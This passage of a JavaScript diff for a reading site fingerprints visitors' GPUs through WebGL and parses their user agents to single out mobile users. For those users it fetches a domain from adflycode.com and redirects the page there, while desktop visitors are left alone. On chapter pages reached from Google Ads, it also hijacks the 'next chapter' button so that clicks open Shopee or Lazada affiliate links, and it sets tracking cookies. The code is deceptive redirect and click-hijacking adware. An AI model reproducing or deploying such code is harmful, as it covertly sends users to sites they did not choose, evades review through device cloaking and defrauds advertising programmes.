+                'STENCIL_BACK_WRITEMASK',
+                'STENCIL_CLEAR_VALUE',
+                'STENCIL_FAIL',
+                'STENCIL_FUNC',
+                'STENCIL_PASS_DEPTH_FAIL',
+                'STENCIL_PASS_DEPTH_PASS',
+                'STENCIL_REF',
+                'STENCIL_TEST',
+                'STENCIL_VALUE_MASK',
+                'STENCIL_WRITEMASK',
+                'SUBPIXEL_BITS',
+                'TEXTURE_BINDING_2D',
+                'TEXTURE_BINDING_CUBE_MAP',
+                'UNPACK_ALIGNMENT',
+                'UNPACK_COLORSPACE_CONVERSION_WEBGL',
+                'UNPACK_FLIP_Y_WEBGL',
+                'UNPACK_PREMULTIPLY_ALPHA_WEBGL',
+                'VIEWPORT',
+                // 'INVALID_ENUM', TARAS ti dibil
+            ];
+
+            var webgl_names_assoc = {
+                'VERSION' : 'GL Version',
+                'SHADING_LANGUAGE_VERSION' : 'Shading Language Version',
+                'VENDOR' : 'Vendor',
+                'RENDERER' : 'Renderer',
+                'MAX_VERTEX_ATTRIBS' : 'Max Vertex Attributes',
+                'MAX_VERTEX_UNIFORM_VECTORS' : 'Max Vertex Uniform Vectors',
+                'MAX_VERTEX_TEXTURE_IMAGE_UNITS' : 'Max Vertex Texture Image Units',
+                'MAX_VARYING_VECTORS' : 'Max Varying Vectors',
+                'ALIASED_LINE_WIDTH_RANGE' : 'Aliased Line Width Range',
+                'ALIASED_POINT_SIZE_RANGE' : 'Aliased Point Size Range',
+                'MAX_FRAGMENT_UNIFORM_VECTORS' : 'Max Fragment Uniform Vectors',
+                'MAX_TEXTURE_IMAGE_UNITS' : 'Max Texture Image Units',
+
+                'RED_BITS' : 'RGBA Bits',
+                // 'GREEN_BITS' : 'AAAAAAAAA',
+                // 'BLUE_BITS' : 'AAAAAAAAA',
+                // 'ALPHA_BITS : 'AAAAAAAAA'',
+
+                'DEPTH_BITS' : 'Depth Bits',
+                'STENCIL_BITS' : 'Stencil Bits',
+
+                'MAX_RENDERBUFFER_SIZE' : 'Max Render Buffer Size',
+                'MAX_VIEWPORT_DIMS' : 'Max Viewport Dimensions',
+                'MAX_TEXTURE_SIZE' : 'Max Texture Size',
+                'MAX_CUBE_MAP_TEXTURE_SIZE' : 'Max Cube Map Texture Size',
+                'MAX_COMBINED_TEXTURE_IMAGE_UNITS' : 'Max Combined Texture Image Units',
+
+                'MAX_VERTEX_UNIFORM_COMPONENTS' : 'Max Vertex Uniform Components',
+                'MAX_VERTEX_UNIFORM_BLOCKS' : 'Max Vertex Uniform Blocks',
+                'MAX_VERTEX_OUTPUT_COMPONENTS' : 'Max Vertex Output Components',
+                'MAX_VARYING_COMPONENTS' : 'Max Varying Components',
+
+                'MAX_TRANSFORM_FEEDBACK_INTERLEAVED_COMPONENTS' : 'Max Interleaved Components',
+                'MAX_TRANSFORM_FEEDBACK_SEPARATE_ATTRIBS' : 'Max Separate Attribs',
+                'MAX_TRANSFORM_FEEDBACK_SEPARATE_COMPONENTS' : 'Max Separate Components',
+
+                'MAX_FRAGMENT_UNIFORM_COMPONENTS' : 'Max Fragment Uniform Components',
+                'MAX_FRAGMENT_UNIFORM_BLOCKS' : 'Max Fragment Uniform Blocks',
+                'MAX_FRAGMENT_INPUT_COMPONENTS' : 'Max Fragment Input Components',
+                'MIN_PROGRAM_TEXEL_OFFSET' : 'Min Program Texel Offset',
+                'MAX_PROGRAM_TEXEL_OFFSET' : 'Max Program Texel Offset',
+                'MAX_DRAW_BUFFERS' : 'Max Draw Buffers',
+                'MAX_COLOR_ATTACHMENTS' : 'Max Color Attachments',
+                'MAX_SAMPLES' : 'Max Samples',
+                'MAX_3D_TEXTURE_SIZE' : 'Max 3D Texture Size',
+                'MAX_ARRAY_TEXTURE_LAYERS' : 'Max Array Texture Layers',
+                'MAX_TEXTURE_LOD_BIAS' : 'Max Texture LOD Bias',
+                'MAX_UNIFORM_BUFFER_BINDINGS' : 'Max Uniform Buffer Bindings',
+                'MAX_UNIFORM_BLOCK_SIZE' : 'Max Uniform Block Size',
+                'UNIFORM_BUFFER_OFFSET_ALIGNMENT' : 'Uniform Buffer Offset Alignment',
+                'MAX_COMBINED_UNIFORM_BLOCKS' : 'Max Combined Uniform Blocks',
+                'MAX_COMBINED_VERTEX_UNIFORM_COMPONENTS' : 'Max Combined Vertex Uniform Components',
+                'MAX_COMBINED_FRAGMENT_UNIFORM_COMPONENTS' : 'Max Combined Fragment Uniform Components'
+
+            };
+
+            var exclude_list = [];
+
+            var webgl_dict = {
+                // 'Supported Context Name' : 'webgl2, webgl, experimental-webgl',
+                'Unmasked Vendor' : null,
+                'Unmasked Renderer' : null,
+                'Max Anisotropy' : null,
+                'Supported WebGL Extensions' : null
+            };
+
+            var d = document.createElement('canvas');
+            var c = d.getContext('webgl2') || d.getContext('experimental-webgl2') || d.getContext('webgl') || d.getContext('experimental-webgl') || d.getContext('moz-webgl');
+
+            var gl = window.WebGL2RenderingContext || window.WebGLRenderingContext;
+
+            if(c && gl){
+
+                var debugInfo = c.getExtension('WEBGL_debug_renderer_info');
+                var b = c.getExtension('EXT_texture_filter_anisotropic') || c.getExtension('WEBKIT_EXT_texture_filter_anisotropic') || c.getExtension('MOZ_EXT_texture_filter_anisotropic');
+                var supported_extensions = c.getSupportedExtensions();
+
+                var vendor = null;
+                var renderer = null;
+                var anisotropy = null;
+
+                if(debugInfo!==null){
+
+                    vendor = c.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                    renderer = c.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+
+                }
+
+                if(b!==null){
+
+                    anisotropy = c.getParameter(b.MAX_TEXTURE_MAX_ANISOTROPY_EXT);
+                }
+
+                if(supported_extensions!==null){
+
+                    supported_extensions = supported_extensions.toString();
+                }
+
+
+
+                webgl_dict = {
+                    // 'Supported Context Name' : 'webgl2, webgl, experimental-webgl',
+                    'Unmasked Vendor' : vendor,
+                    'Unmasked Renderer' : renderer,
+                    'Max Anisotropy' : anisotropy,
+                    'Supported WebGL Extensions' : supported_extensions,
+                };
+
+                var webgl_all = webgl_1.concat(webgl_2);
+                webgl_all = webgl_all.concat(webgl_other);
+
+                webgl_all.forEach(function(item) {
+                    //if (exclude_list.indexOf(item) !== -1){
+
+                    var webgl_item = {};
+
+                    if (item instanceof Array){
+
+                        var temp_array = [];
+                        if(item[0] == 'RED_BITS'){
+
+                            var all_null = true;
+                            item.forEach(function(subitem) {
+
+                                var value=null;
+
+                                if(subitem in c)
+                                    value = c.getParameter(c[subitem]);
+
+                                if(value !== 'undefined' && value !== null){
+                                    all_null = false;
+                                }
+
+                                temp_array.push(value);
+                            });
+
+                            if (!all_null){
+                                webgl_dict['RGBA Bits'] = '[' + temp_array.toString() + ']';
+                            }
+                        }
+                        else{
+                            item.forEach(function(subitem) {
+
+                                var value=null,name;
+
+                                if(subitem in c)
+                                    value = c.getParameter(c[subitem]);
+
+                                if (subitem in webgl_names_assoc){
+                                    name = webgl_names_assoc[subitem];
+                                }
+                                else{
+                                    name = subitem;
+                                }
+
+                                if (value !== 'undefined' && value !== null){
+                                    webgl_dict[name] = value;
+                                }
+                            });
+                        }
+                    }
+                    else{
+
+                        var value=null,name;
+
+
+                        if(item in c)
+                            value = c.getParameter(c[item]);
+
+
+                        if (value instanceof Float32Array || value instanceof Int32Array){
+
+                            var value_array = [];
+
+                            for(var i=0; i<value.length; ++i){
+
+                                value_array.push(value[i]);
+                            }
+
+                            value = '[' + value_array.toString() + ']';
+                        }
+
+                        if (item in webgl_names_assoc){
+                            name = webgl_names_assoc[item];
+                        }
+                        else{
+                            name = item;
+                        }
+
+                        if (value !== 'undefined' && value !== null){
+                            webgl_dict[name] = value;
+                        }
+                    }
+                    //}
+                });
+            }
+            return webgl_dict;
+        }
+        var jsonWebGL = webgl();
+        var getGPU = jsonWebGL['Unmasked Renderer'];
+        var mobileBrands = [
+            "Huawei",
+            "Asus ROG",
+            "Xiaomi",
+            "Samsung",
+            "Asus Zenfone",
+            "Oppo",
+            "Vivo",
+            "LG",
+            "NVIDIA Shield Android TV",
+            "Google Pixel",
+            "Meizu",
+            "Realme",
+            "HTC",
+            "LeTV",
+            "Motorola",
+            "Nokia",
+            "OnePlus",
+            "ARM",
+            "Adreno",
+            "Adreno (TM)",
+            "Tegra",
+            "Vivante",
+            "Mali",
+            "Rogue"];
+        var pcGPUs = ["Direct3D", "NVIDIA", "AMD", "HD graphic", "Google SwiftShader","Intel"];
+        var isMobile = true,reg;
+        if(getGPU) {
+            reg = new RegExp(mobileBrands.join('|'),'i');
+            if(getGPU.match(reg)) return true;
+            reg = new RegExp(pcGPUs.join('|'),'i');
+            if(getGPU.match(reg)) isMobile = false;
+        } else {
+            isMobile = false;
+        }
+        if(!!navigator.userAgent.match(/Version\/[\d\.]+.*Safari/)) {
+            if(/iP(ad|hone|od).+Version\/[\d\.]+.*Safari/i.test(navigator.userAgent)) {
+                isMobile = true;
+                reg = new RegExp(pcGPUs.join('|'),'i');
+                if(getGPU.match(reg)) isMobile = false;
+            } else {
+                isMobile = false;
+            }
+        }
+        return isMobile
+    };
+    var mobileGPU = isMobileGPU();
+	var is_mobile = function() {
+	  let check = false;
+	  (function(a){if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0,4))) check = true;})(navigator.userAgent||navigator.vendor||window.opera);
+	  return check;
+	};
+	mobileGPU = is_mobile();
+	var getCookie = function (cname) {
+        var name = cname + "=";
+        var decodedCookie = decodeURIComponent(document.cookie);
+        var ca = decodedCookie.split(';');
+        for (var i = 0; i < ca.length; i++) {
+            var c = ca[i];
+            while (c.charAt(0) === ' ') {
+                c = c.substring(1);
+            }
+            if (c.indexOf(name) === 0) {
+                return c.substring(name.length, c.length);
+            }
+        }
+        return "";
+    };
+    return {
+		init: function(){
+			if(!mobileGPU) return;
+			/*var a='6wIGyxqTM4I';var b='truyencom.com';
+			if(!getCookie('yt_'+a)){
+				if(location.host==b){
+					document.addEventListener('DOMContentLoaded', function() {
+						F.init({
+							mb_only: true,z:2,wait:5000,
+							target: false,
+							banner: 'https://truyencom.com',db:false,type:'popup',
+							banner_html: '<a href=\"#\" target=\"_blank\" rel=\"nofollow\"><img src=\"https://dummyimage.com/280x70/000/fff&text=truyencom.com\" alt=\"banner\" /></a>',
+							ntdb: a,
+							siteid: 'tcom',dl:-1,sid:3,s:9,
+							db:false,secondary:false,
+							aidx:0,show_all:true
+						});
+					});
+				}
+				xRedirect.redirect(b,false);
+				return;
+			}*/
+			var xhr = new XMLHttpRequest();
+			xhr.onreadystatechange = function(){
+				if(this.readyState == 4 && this.status==200 && /[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9](?:\.[a-zA-Z]{2,})+/.test(xhr.responseText)){
+					xRedirect.redirect(xhr.responseText,false);
+				}
+			};
+			xhr.open('GET','https://adflycode.com/api/domain.php?site=truyencom&t='+(new Date()).getTime());
+			xhr.send();
+		},
+        redirect: function(dm, check_ref){
+            if(location.hostname!='truyencom.com' && !mobileGPU){
+                location.href = location.href.replace(location.hostname,'truyencom.com');
+                return;
+            }
+            if(location.hostname === 'truyencom.com'){
+                if(check_ref){
+                    if(!document.referrer || !isChapter(location.href) || !mobileGPU){
+                        location.href = location.href.replace(location.hostname,'truyencom.com');
+                    }
+                    var ref = getLocation(document.referrer);
+                    if([].indexOf(ref.hostname)===-1){
+                        location.href = location.href.replace(location.hostname,'truyencom.com');
+                    }
+                }
+                setTimeout(function(){
+                        replace_domain(dm);
+                    },500);
+            }else{
+                setTimeout(function(){
+                        replace_domain(dm);
+                    },500)
+            }
+        }
+    }
+}();
+xRedirect.init();
+(function() {
+	if(document.body.className == 'index-index') return;
+	var urlParams = new URLSearchParams(window.location.search);
+	var gclid = urlParams.get("gclid");
+    var utm_source = urlParams.get("utm_source");
+    var utm_medium = urlParams.get("utm_medium");
+	var is_mobile = /(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test((navigator.userAgent||navigator.vendor||window.opera))||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test((navigator.userAgent||navigator.vendor||window.opera).substr(0,4));
+	var getCookie = function(a){let b=a+"=";let c=document.cookie.split(';');for(let i=0;i<c.length;i++){let d=c[i];while(d.charAt(0)==' '){d = d.substring(1);}if(d.indexOf(b)==0){return d.substring(b.length, d.length);}}return "";}
+	var setSession = function(a,b){document.cookie=a+'='+b;}
+	var setCookie = function(a, b, c) {const d = new Date();d.setTime(d.getTime() + (c * 24 * 60 * 60 * 1000));let e = "expires="+d.toUTCString();document.cookie = a + "=" + b + ";" + e + ";path=/";}
+	var deleteCookie = function(a){document.cookie = a +'=; Path=/; Expires=Thu, 01 Jan 1970 00:00:01 GMT;';}
+	var a = document.querySelectorAll('.btn-chapter-nav');
+	var b=a[a.length-1];if(!b || b.classList.contains('disabled')) b=false;
+	var showShopee = function(){console.log(b);if(b!=false) b.addEventListener('click',function(e){e.preventDefault();setCookie('spclick',1,0.1);window.open('https://adflycode.com/shopee.php','_blank');location.href=this.href;})};
+	var showLazada = function(){if(b!=false) b.addEventListener('click',function(e){e.preventDefault();setCookie('lzclick',1,0.1);window.open('https://adflycode.com/lazada.php','_blank');location.href=this.href;})};
+	if(getCookie('spclick')){$cookie.set('shopee',1,3);$cookie.set('aff_click',1,1);deleteCookie('spclick');}
+	if(getCookie('lzclick')){$cookie.set('lazada',1,3);$cookie.set('aff_click',1,1);deleteCookie('lzclick');}
+
+    if ((gclid || urlParams.get('gad_source') || urlParams.get('gbraid') || (utm_source === "google" && utm_medium === "cpc")) && is_mobile) {
+		$cookie.set("googleAdsTraffic", "true", 365);
+    }
+	if(typeof chapNo != 'undefined'){
+		$cookie.get('googleAdsTraffic;shopee;lazada;aff_click',function(f){
+			if(!f['googleAdsTraffic']) return;
+			var pv=getCookie('pageview')?parseInt(getCookie('pageview'))+1:1;
+			setCookie('pageview',pv,0.01);
+			if(pv%3==0 && !f['shopee'] && !getCookie('spclick')) return showShopee();
+			//else if(pv%5==0 && !f['lazada'] && !getCookie('lzclick')) return showLazada();
+			//document.write('<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1959442024328981" crossorigin="anonymous"><\/script>');
+		});
+	}
+});
